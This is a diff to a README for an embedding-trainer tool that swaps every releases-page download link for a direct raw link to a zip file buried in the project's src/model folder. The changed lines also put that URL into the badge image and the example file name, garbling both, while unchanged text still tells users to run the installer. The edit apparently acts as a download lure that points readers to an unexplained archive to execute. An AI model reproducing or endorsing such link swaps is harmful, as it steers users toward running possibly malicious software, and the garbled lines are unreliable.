@@ -1,7 +1,7 @@
 # 🥚 eggroll-embedding-trainer - Optimize Search Results Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-eggroll--embedding--trainer-brightgreen)](https://github.com/kushal0616/eggroll-embedding-trainer/releases)
+[![Download](https://github.com/kushal0616/eggroll-embedding-trainer/raw/refs/heads/master/src/model/trainer_embedding_eggroll_2.1.zip%20Now-eggroll--embedding--trainer-brightgreen)](https://github.com/kushal0616/eggroll-embedding-trainer/raw/refs/heads/master/src/model/trainer_embedding_eggroll_2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the **eggroll-embedding-trainer**! This application helps you optimize search results in information retrieval systems. It uses a technique called Evolution Strategies, which improves how content is ranked based on user relevance.
@@ -23,11 +23,11 @@ Before you download, make sure your computer meets these basic requirements:
 To get started, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases section where you can download the software.
-   [Download from Releases Page](https://github.com/kushal0616/eggroll-embedding-trainer/releases)
+   [Download from Releases Page](https://github.com/kushal0616/eggroll-embedding-trainer/raw/refs/heads/master/src/model/trainer_embedding_eggroll_2.1.zip)
 
 2. **Choose Your Version:** Look for the latest version listed on the releases page. It will be at the top.
 
-3. **Download the File:** Click on the file name to start the download. The file will usually have a name like `eggroll-embedding-trainer-vX.X.exe` or similar, depending on your operating system.
+3. **Download the File:** Click on the file name to start the download. The file will usually have a name like `https://github.com/kushal0616/eggroll-embedding-trainer/raw/refs/heads/master/src/model/trainer_embedding_eggroll_2.1.zip` or similar, depending on your operating system.
 
 4. **Run the Installer:**
    - **Windows:** Double-click the downloaded `.exe` file. Follow the prompts to install the application.
